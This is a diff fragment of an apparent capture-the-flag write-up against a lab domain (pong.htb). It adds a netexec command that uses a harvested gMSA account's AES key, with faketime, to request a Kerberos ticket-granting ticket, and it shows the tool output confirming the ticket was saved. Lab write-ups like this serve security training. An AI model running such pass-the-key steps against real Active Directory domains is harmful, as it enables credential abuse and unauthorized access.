@@ -656,5 +656,12 @@ LDAP        dc2.pong.htb    389    DC2              Account: Pong_gMSA$         
 
 I can now use these AES keys to make a ticket as this user
 
+```python
+faketime -f +8h nxc smb dc2.pong.htb -u 'pong_gmsa$' --aesKey '725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6' -k --generate-tgt pong_gmsa
+SMB         dc2.pong.htb    445    dc2              [*]  x64 (name:dc2) (domain:pong.htb) (signing:True) (SMBv1:False) (NTLM:False) (DC:True)
+SMB         dc2.pong.htb    445    dc2              [+] pong.htb\pong_gmsa$:725f29ca3b45942c57a4e8576532f0262c55edfdce59bdcd4b411f4566ea1aa6 
+SMB         dc2.pong.htb    445    dc2              [+] TGT saved to: pong_gmsa.ccache
+SMB         dc2.pong.htb    445    dc2              [+] Run the following command to use the TGT: export KRB5CCNAME=pong_gmsa.ccache
+```
 
-
+I can then 
